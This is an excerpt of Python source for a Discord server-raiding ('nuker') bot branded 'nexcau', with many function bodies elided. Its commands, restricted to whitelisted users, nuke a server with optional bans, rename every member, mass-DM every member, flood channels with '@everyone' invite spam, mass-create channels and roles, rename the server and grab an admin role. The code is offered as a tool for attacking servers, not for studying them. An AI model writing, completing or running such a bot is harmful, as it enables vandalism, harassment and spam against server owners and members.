...
embedColor = 0x5c92ff
colors = {"main": Fore.WHITE,
          "red": Fore.RED}
msgs = {"info": f"{colors['red']}[{colors['main']}i{colors['red']}]",
        "+": f"{colors['red']}[{colors['main']}+{colors['red']}]",
        "error": f"{colors['red']}[{colors['red']}e{colors['red']}]",
...
def checkVersion():
    if version == "":
        return ""
    req = requests.get(
        "https://raw.githubusercontent.com/iu6v/brunuker/master/version.txt")
...
print(f'{colors["main"]}\n\n                     ___   ___   _   _ _   _ _ _     _     ___   ___       ' + "\n"
      ...
      r'                    |  _ (|    /| | | |   ( | | |  _| |  _|  _)_|    /  ' + "\n"
      r'                    | (_) ) |\ \| (_) | |\ \| | |_( ) |_( ) (_( ) |\ \ ' + "\n"
      r'                    (____/(_) (_)_____)_) (_)_)____/(____/(____/(_) (_)   ' 
      '\n'
   

      f"{colors['red']}                           Discord: {colors['main']}toddy#9994\n"
      f"{colors['red']}                           Versão: {colors['main']}{version} {checkVersion()}\n")
...
try:
    ...
    print(f"{msgs['info']} config.json carregada")
except FileNotFoundError:
...
async def on_ready():
    print(f"\n\n{colors['main']}" + ("═"*75).center(95) + f"\n{colors['red']}" +
          f"Logado em {bot.user}".center(95) + "\n" +
          f"Prefixo: {bot.command_prefix}".center(95) + "\n" +
          f"Servers: {len(bot.guilds)}".center(95) + "\n" +
          f"Membros: {len(bot.users)} ".center(95) + f"\n{colors['main']}" + ("═"*75).center(95) + f"\n\n{colors['red']}")


@bot.event
async def on_command(ctx):
    print(
        f"{msgs['info']} Executed {ctx.command} ({colors['main']}{ctx.message.author}{colors['red']})")
...
async def on_command_error(ctx, err):
    ...
    if (isinstance(err, errors.BadArgument) or isinstance(err, commands.MissingRequiredArgument)
        ...
        print(
            f'{colors["red"]}\n\n{"".join(traceback.format_exception(type(err), err, err.__traceback__))}{colors["red"]}\n')
...
async def help(ctx):
    ...
    embed.set_author(name="nexcau",
                     url="https://www.youtube.com/channel/UCrRtRpG9UylSHw2GnZLR0lA")
    embed.add_field(
    ...
    embed.add_field(name="\u200b\nInfo",
                    value=f">>> **nexcau**\nMade by <@404323086561837066>\nVersion: {version} {checkVersion()}\nGitHub: https://www.youtube.com/channel/UCrRtRpG9UylSHw2GnZLR0lA\n", inline=False)
...
async def settingsPrefix(ctx, newPrefix):
    ...
    print(
        f"{msgs['info']} Prefix is {colors['main']}{newPrefix}{colors['red']} now")
...
async def settingOwners(ctx, action, *, users):
    ...
    if action == "add":
        ...
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(
            f"{msgs['info']} Added {colors['main']}{str(users)[1:-1]}{colors['red']} to owners")
        await ctx.message.add_reaction('✅')
        ...
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(
            f"{msgs['info']} Removed {colors['main']}{str(users)[1:-1]}{colors['red']} from owners")
        await ctx.message.add_reaction('✅')
    else:
        await ctx.message.add_reaction('❌')
...
@commands.check(isOwner)
async def settingsActivity(ctx, action, activityType="playing", *, text=f"nexcau v{version}"):
    global config
    global activity
    if action == "set":
...
@commands.check(isWhitelisted)
async def nuke(ctx, ban: bool = True, text: str = "nexcau"):
    await msg_delete(ctx)
...
@commands.check(isWhitelisted)
async def renameEveryone(ctx, *, name="nexcau"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
...
@commands.check(isWhitelisted)
async def dmEveryone(ctx, *, msg="nexcau"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
...
@commands.check(isWhitelisted)
async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone https://discord.gg/yAVbugcAng"):
    await msg_delete(ctx)
...
@commands.check(isWhitelisted)
async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone https://discord.gg/yAVbugcAng"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def spamWithChannels(ctx, amount: int = 25, *, name="nexcau"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def spamWithRoles(ctx, amount: int = 25, *, name="nexcau"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def editServerName(ctx, *, name="nexcau"):
    await msg_delete(ctx)
    try:
...
@commands.check(isWhitelisted)
async def getAdmin(ctx, *, rolename="nexcau"):
    await msg_delete(ctx)
    try:
...
async def reviveGuild(ctx, guildId: int = None):
    if guildId:
        ...
        try:
            await guild.create_text_channel(name="nexcau")
...
try:
    ...
    print(f"{msgs['error']} It looks like you didn't enable the necessary intents in the developer portal."
          f"Visit {colors['main']}https://discord.com/developers/applications/ {colors['red']}and turn them on.\n")
    print(msgs['pressenter'])
    input()
    os._exit(0)
except Exception as e:
    print(f'{colors["red"]}\nAn error occured while logging:\n{"".join(traceback.format_exception(type(e), e, e.__traceback__))}{colors["red"]}\n')
    print(msgs['pressenter'])
    input()
    os._exit(0)
